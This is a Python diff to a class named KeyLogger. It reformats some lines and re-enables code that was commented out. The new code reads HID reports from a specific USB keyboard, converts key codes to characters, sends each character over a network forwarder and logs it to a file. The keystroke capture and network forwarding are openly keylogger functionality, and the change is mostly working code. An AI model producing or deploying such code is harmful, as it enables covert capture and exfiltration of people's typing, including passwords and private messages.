@@ -14,7 +14,9 @@ class NoDeviceFound(Exception):
 class KeyLogger:
     __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]
 
-    def __init__(self, keyboard_layout: dict[int, int], data_handler: DataHandler) -> None:
+    def __init__(
+        self, keyboard_layout: dict[int, int], data_handler: DataHandler
+    ) -> None:
         # get all USB Devices
         self.__devices: list[int, int] = self.get_devices()
         # create a data handler
@@ -70,8 +72,8 @@ class KeyLogger:
 
     def run(self):
         # #Mini Keyboard
-        id_vendor = 0x1c4f
-        device_id = 0x008b
+        id_vendor = 0x1C4F
+        device_id = 0x008B
         keyboard = hid.device()
         keyboard.open(id_vendor, device_id)
         while True:
@@ -82,40 +84,19 @@ class KeyLogger:
                 # close all network sockets
                 self.__forwarder.__del__()
                 exit()
-            print(data)
-            # if data:
-            #     key_code = data[2]  # The key code is in byte
-            #     try:
-            #         offset: int = self.keyboard_layout[str(key_code)]
-            #         if offset is None:
-            #             continue
-            #     except KeyError:
-            #         logging.error(f"Key {key_code} not in the layout")
-            #         continue
-            #     char: chr = chr(offset + key_code)
-            #     try:
-            #         self.__forwarder.send_over_network(data=char)
-            #         # write data in file
-            #         self.data_handler.write(f'{key_code} {char}')
-            #     except ConnectionResetError:
-            #         self.__forwarder.listen()
-
-
-
-
-
-                # if key_code < 30:
-                #     char = chr(key_code + 93)  # Convert the key code to a character
-                # elif 30 <= key_code and key_code < 49:
-                #     char = chr(key_code + 19)
-                # elif key_code == 39:
-                #     char = chr(39 + 9)
-                # else:
-                #     char = "Not FOUND"
-                # if char:
-                #     try:
-                #         self.__forwarder.send_over_network(data=char)
-                #         # write data in file
-                #         self.data_handler.write(f'{key_code} {char}')
-                #     except ConnectionResetError:
-                #         self.__forwarder.listen()
+            if data:
+                key_code = data[2]  # The key code is in byte
+                try:
+                    offset: int = self.keyboard_layout[str(key_code)]
+                    if offset is None:
+                        continue
+                except KeyError:
+                    logging.error(f"Key {key_code} not in the layout")
+                    continue
+                char: chr = chr(offset + key_code)
+                try:
+                    self.__forwarder.send_over_network(data=char)
+                    # write data in file
+                    self.data_handler.write(f"{key_code} {char}")
+                except ConnectionResetError:
+                    self.__forwarder.listen()
